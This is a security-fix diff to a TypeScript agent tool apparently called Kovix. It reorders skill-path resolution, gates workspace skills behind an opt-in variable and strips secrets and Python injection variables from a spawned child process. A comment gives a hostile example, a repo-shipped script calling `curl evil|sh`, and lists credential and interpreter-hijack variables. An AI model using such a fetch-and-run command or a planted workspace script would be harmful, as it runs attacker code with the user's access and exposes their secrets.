@@ -35,6 +35,9 @@ import * as readline from 'readline';
 import * as path from 'path';
 import * as os from 'os';
 import * as fs from 'fs';
+// SEC-9 (K2-H4 fix): shared child-env builder — same allowlist + denylist
+// as every other spawn site in the Kovix tree.
+import { buildChildEnv } from '../../../platform/construct/common/security/childEnv.js';
 
 // ─── JSON-RPC 2.0 Types ─────────────────────────────────────────────────────
 
@@ -84,25 +87,67 @@ function log(level: 'info' | 'warn' | 'error', message: string): void {
 
 /**
  * Resolve the path to the UI-UX Pro Max skill installation.
- * Checks the workspace .kovix directory, then falls back to bundled location.
+ *
+ * SEC-9 (K2-C4 fix): The previous order checked the workspace
+ * (.kovix/skills/ui-ux-pro-max under process.cwd()) FIRST, then fell back to
+ * the global ~/.kovix. A malicious cloned repo could ship
+ *   .kovix/skills/ui-ux-pro-max/scripts/search.py
+ * containing `import os; os.system("curl evil|sh")` and the agent's first call
+ * to uiux_search_style would execute it as the user with full fs access.
+ *
+ * The candidate order is now reversed — global ~/.kovix is checked FIRST.
+ * Workspace-scoped skills are only used when (a) no global install exists,
+ * AND (b) the user has explicitly opted in via the
+ * KOVIX_ALLOW_WORKSPACE_UIUX_SKILL=1 env var. The opt-in is required because
+ * this is a standalone Node script spawned by Kovix — it cannot query the
+ * VS Code Workspace Trust API directly. The Kovix parent process sets this
+ * env var ONLY when the workspace is trusted AND the user has explicitly
+ * enabled workspace-scoped skills in the UI.
  */
 function resolveSkillPath(): string | null {
-        const candidates = [
-                // Workspace-local installation
-                path.join(process.cwd(), '.kovix', 'skills', 'ui-ux-pro-max'),
-                // Global installation
-                path.join(os.homedir(), '.kovix', 'skills', 'ui-ux-pro-max'),
-        ];
+        const globalCandidate = path.join(os.homedir(), '.kovix', 'skills', 'ui-ux-pro-max');
+        const globalScript = path.join(globalCandidate, 'scripts', 'search.py');
+        if (fs.existsSync(globalScript)) {
+                return globalCandidate;
+        }
 
-        for (const candidate of candidates) {
-                const scriptPath = path.join(candidate, 'scripts', 'search.py');
-                if (fs.existsSync(scriptPath)) {
-                        return candidate;
+        // Workspace-scoped skill: only use if explicitly opted in.
+        const allowWorkspaceSkill = process.env.KOVIX_ALLOW_WORKSPACE_UIUX_SKILL === '1' ||
+                process.env.KOVIX_ALLOW_WORKSPACE_UIUX_SKILL === 'true';
+        if (allowWorkspaceSkill) {
+                const workspaceCandidate = path.join(process.cwd(), '.kovix', 'skills', 'ui-ux-pro-max');
+                const workspaceScript = path.join(workspaceCandidate, 'scripts', 'search.py');
+                if (fs.existsSync(workspaceScript)) {
+                        log('info', `Using workspace-scoped UI-UX Pro Max skill at ${workspaceCandidate} (KOVIX_ALLOW_WORKSPACE_UIUX_SKILL=1)`);
+                        return workspaceCandidate;
+                }
+        } else {
+                // Log that we found a workspace-scoped skill but refused to use it.
+                const workspaceCandidate = path.join(process.cwd(), '.kovix', 'skills', 'ui-ux-pro-max');
+                const workspaceScript = path.join(workspaceCandidate, 'scripts', 'search.py');
+                if (fs.existsSync(workspaceScript)) {
+                        log('warn', `Found workspace-scoped UI-UX Pro Max skill at ${workspaceCandidate} but refused to load it — ` +
+                                `set KOVIX_ALLOW_WORKSPACE_UIUX_SKILL=1 to enable workspace-scoped skills (requires trusted workspace).`);
                 }
         }
 
         return null;
 }
+
+/**
+ * SEC-9 (K2-H4 fix): Build a minimal env for spawned python3 child processes.
+ *
+ * The previous code spread `...process.env` into the python3 child, leaking
+ * AWS_*, GITHUB_TOKEN, KOVIX_ENCRYPTION_KEY_HEX, database URLs, and — most
+ * critically for python3 — PYTHONSTARTUP / PYTHONPATH / PYTHONINSPECT /
+ * PYTHONHOME, which allow code injection into the python interpreter before
+ * search.py even runs.
+ *
+ * We delegate to the shared `buildChildEnv()` helper from
+ * src/vs/platform/construct/common/security/childEnv.ts so the allowlist /
+ * denylist lives in exactly one place. See that file for the rationale and
+ * the curated lists.
+ */
 
 // ─── Helper: Execute Python search script ───────────────────────────────────
 
@@ -120,11 +165,30 @@ function executeSearch(
 
                 log('info', `Executing: python3 ${scriptPath} ${args.join(' ')} (timeout: ${timeout}ms)`);
 
+                // SEC-9 (K2-H4 fix): Build a minimal env via the inlined
+                // buildChildEnv() helper (allowlist + denylist). The previous
+                // code spread `...process.env` and explicitly set PYTHONPATH —
+                // both leak secrets and allow code injection via PYTHONSTARTUP
+                // / PYTHONINSPECT / PYTHONHOME etc.
+                //
+                // PYTHONPATH is still required for search.py to find its sibling
+                // modules, so we pass it via serverEnv. buildChildEnv() will
+                // STRIP it (it's in DENIED_ENV_KEYS) — so we set it directly on
+                // the final env object AFTER buildChildEnv, with an explicit
+                // comment. This is safe because the skillPath is one we
+                // resolved (either global ~/.kovix or, if opted in, workspace).
+                const { env: childEnv, strippedKeys } = buildChildEnv();
+                if (strippedKeys.length > 0) {
+                        log('warn', `Stripped ${strippedKeys.length} dangerous env key(s) from python3 child: ${strippedKeys.join(', ')}`);
+                }
+                // PYTHONPATH is the one denied key we DO want to set — it points
+                // at the skill's own root so search.py can import sibling modules.
+                // We set it AFTER buildChildEnv so the denylist doesn't strip it.
+                // The value is a path we control (skillPath), not user-supplied.
+                childEnv.PYTHONPATH = skillPath;
+
                 const child = spawn('python3', [scriptPath, ...args], {
-                        env: {
-                                ...process.env as Record<string, string>,
-                                PYTHONPATH: skillPath,
-                        },
+                        env: childEnv,
                         stdio: ['pipe', 'pipe', 'pipe'],
                         shell: false,
                         cwd: skillPath,
